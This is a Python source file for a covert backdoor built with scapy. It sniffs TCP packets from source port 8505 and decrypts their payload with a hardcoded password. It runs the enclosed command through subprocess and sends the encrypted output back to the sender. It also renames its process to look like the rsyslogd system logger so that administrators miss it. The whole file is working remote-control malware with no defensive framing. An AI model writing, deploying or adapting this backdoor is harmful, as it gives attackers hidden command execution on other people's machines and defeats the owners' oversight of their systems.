import base64
from scapy.all import *
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.exceptions import InvalidSignature
from cryptography.fernet import InvalidToken
import subprocess
from setproctitle import setproctitle


def backdoor_packet_handler(pkt):
    if TCP in pkt and pkt[TCP].sport==8505:
        try:
            command = (decrypt(pkt.load, b"password")).decode()
            start_index = command.find("COMMAND_START")
            end_index = command.find("COMMAND_END")
            formatted_command = command[start_index + 13: end_index].split()
            result = subprocess.run(formatted_command, stdout=subprocess.PIPE)
            encrypted_result = encrypt(result.stdout, b'password')
            response = IP(dst=pkt[IP].src)/TCP(dport=pkt[TCP].sport)/encrypted_result
            send(response)
            return
        except InvalidToken:
            return
        except FileNotFoundError:
            encrypted_result = encrypt(b"Command doesn't exist", b'password')
            response = IP(dst=pkt[IP].src)/TCP(dport=pkt[TCP].sport)/encrypted_result
            send(response)
            return


# ----------------------------------------------------------------------------------------------------------------------
# The encrypt function takes in a message and encrypts using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# hiddenMsg - the plaintext to be encrypted (in bytes)
# password - the password used to encrypt the message (in bytes)
#
# Returns:
# encrypt returns an array of bytes that represents the encrypted message
# ----------------------------------------------------------------------------------------------------------------------
def encrypt(hiddenMsg, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    token = encrypter.encrypt(hiddenMsg)
    return token

# ----------------------------------------------------------------------------------------------------------------------
# The decrypt function takes in ciphertext and decrypts it using the Fernet encryption algorithm from the cryptography
# package
#
# Params:
# ciphertext - the ciphertext to be decrypted (in bytes)
# password - the password used to decrypt the message (in bytes)
#
# Returns:
# decrypt returns an array of bytes that represents the decrypted message
# ----------------------------------------------------------------------------------------------------------------------
def decrypt(cipherText, password):
    salt = b'?%U;\x97\xd8%\x8c\x08\xae\xdeL\xae\xba\xa5M'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )

    key = base64.urlsafe_b64encode(kdf.derive(password))
    encrypter = Fernet(key)
    return encrypter.decrypt(cipherText)


#Actual run code
setproctitle("/user/sbin/rsyslogd -n")
sniff(prn=backdoor_packet_handler, filter="tcp and src port 8505", store=0)
